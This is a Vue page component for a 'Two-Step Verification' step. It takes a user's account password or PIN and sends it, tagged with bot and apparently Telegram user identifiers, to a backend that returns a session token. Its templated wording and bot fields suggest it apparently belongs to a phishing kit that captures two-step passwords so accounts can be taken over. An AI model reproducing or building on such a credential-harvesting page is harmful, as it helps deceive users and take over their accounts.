<script setup>
import { ref } from "vue";
import { useRouter } from "vue-router";
import { useUserStore } from "../stores/userStore";
import { useTemplateStore } from "../stores/templateStore";
import { api } from "../api/client";

const router = useRouter();
const userStore = useUserStore();
const templateStore = useTemplateStore();

const password = ref("");
const submitting = ref(false);
const errorMsg = ref("");

async function handleSubmit() {
  errorMsg.value = "";
  if (!password.value) {
    errorMsg.value = "Please enter your security PIN or password.";
    return;
  }

  submitting.value = true;
  try {
    const res = await api.enterPass({
      password: password.value,
      bot_user_id: userStore.uId,
      bot_id: userStore.botId,
      user_tg: userStore.user,
    });

    if (res?.ok) {
      userStore.sessionToken = res.session_token || "";
      userStore.state = "end";
      router.push("/end");
    } else {
      errorMsg.value = res?.error || "Incorrect password.";
    }
  } catch (err) {
    errorMsg.value = err.message;
  } finally {
    submitting.value = false;
  }
}
</script>

<template>
  <section class="card">
    <h2>{{ templateStore.template.pass.title || "Two-Step Verification" }}</h2>
    <p>
      {{
        templateStore.template.pass.description ||
        "Enter your account password or PIN to finish logging in."
      }}
    </p>
    <p v-if="userStore.passwordHint" class="info-badge">Hint: {{ userStore.passwordHint }}</p>

    <input
      v-model="password"
      type="password"
      placeholder="Enter password"
      class="input"
      @keyup.enter="handleSubmit"
    />
    <p v-if="errorMsg" class="error">{{ errorMsg }}</p>

    <button class="btn" :disabled="submitting" @click="handleSubmit">
      {{ submitting ? "Checking..." : templateStore.template.pass.buttonText || "Continue" }}
    </button>
  </section>
</template>
